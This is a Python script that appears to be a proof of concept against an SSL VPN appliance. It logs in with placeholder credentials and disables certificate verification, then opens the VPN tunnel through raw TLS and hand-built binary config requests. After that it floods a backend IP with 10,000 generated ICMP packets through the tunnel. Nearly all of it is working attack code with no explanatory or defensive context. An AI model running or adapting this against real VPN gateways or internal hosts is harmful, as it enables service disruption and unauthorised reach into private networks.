import requests, urllib3, time, socket, ssl, logging, struct
from utils import generate_icmp_pkt
from config import VIRTUAL_SITE_IP, BACKEND_IP




logging.basicConfig(level=logging.INFO)
urllib3.disable_warnings()

base_url = 'https://%s/' %(VIRTUAL_SITE_IP)
sess = requests.session()

# Post login
url = base_url + 'prx/000/http/localhost/login'
d = dict()
d['method'] = 'default_method_localdb'
d['uname']  = 't'
d['pwd']    = 't'
d['pwd1']   = ''
d['pwd2']   = ''
res = sess.post(url, verify=False, data=d)
logging.info('Post login successfully and get cookie:%s' %sess.cookies.get_dict())


# Create vpn tunnel connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = ssl.wrap_socket(s, cert_reqs=ssl.CERT_NONE)

ssl_sock.connect((VIRTUAL_SITE_IP, 443))
cookie = 'AN_nav1=' + sess.cookies['AN_nav1'] + ';ANsession5450706721064400=' + sess.cookies['ANsession5450706721064400'] + ';ANStandalone=true'
cookie = cookie.encode('utf-8')
ssl_sock.send(b'Get /vpntunnel HTTP/1.1\r\nHost: %s\r\nCookie: %s\r\nappid: SSPVPN\r\nclientid: d561652d-400b-4bfd-a4e4-7cfa8ce4d246\r\ncpuid: \r\nhostname: 5CD539976\r\n\r\n' %(VIRTUAL_SITE_IP.encode(encoding='utf_8'), cookie))
logging.info('VPN Tunnel ssl socket established: %s' %ssl_sock.read(1024).decode('utf-8'))

# CLIENT_COMMONCONFIG_REQUEST
client_common_config_request = bytearray(16)
client_common_config_request[0] = 0x50 # CLIENT_COMMONCONFIG_REQUEST = 0x50

ssl_sock.send( bytes(client_common_config_request) )
server_common_config_response = ssl_sock.read(1024)
logging.info('VPN Tunnel get server common config response, length:%s: %s' %(len(server_common_config_response), server_common_config_response))
# extract common config from server response
vpn_tundata = server_common_config_response[0:16]
vpn_common_config = server_common_config_response[16:68]
vcc_netpool_flags = vpn_common_config[4:8]
logging.info('VPN Tunnel netpool flags is: %s' %vcc_netpool_flags)

# CLIENT_NETCONFIG_REQUEST
client_net_config_request = bytearray(48)
client_net_config_request[0] = 0x54 # CLIENT_NETCONFIG_REQUEST = 0x54
client_net_config_request[12:16] = struct.pack('<L', 32)
ssl_sock.send(bytes(client_net_config_request))
server_net_config_response = ssl_sock.read(1024)
logging.info('VPN Tunnel get server net config response, length:%s: %s' %(len(server_net_config_response), server_net_config_response))
# vnc_clientip = server_net_config_response[16:52][16:20]
vnc_clientip = server_net_config_response[32:36]
logging.info('VPN Tunnel create successfully, virtual ip addr is: %s origin: %s' %(socket.inet_ntoa(vnc_clientip), vnc_clientip) )

icmp_pkt = generate_icmp_pkt(127, vnc_clientip, socket.inet_aton(BACKEND_IP))

for i in range(10000):
    ssl_sock.send(bytes(icmp_pkt))
    ssl_sock.read(256)


# Logout
time.sleep(10)
url = base_url + 'prx/000/http/localhost/logout'
res = sess.get(url, verify=False)
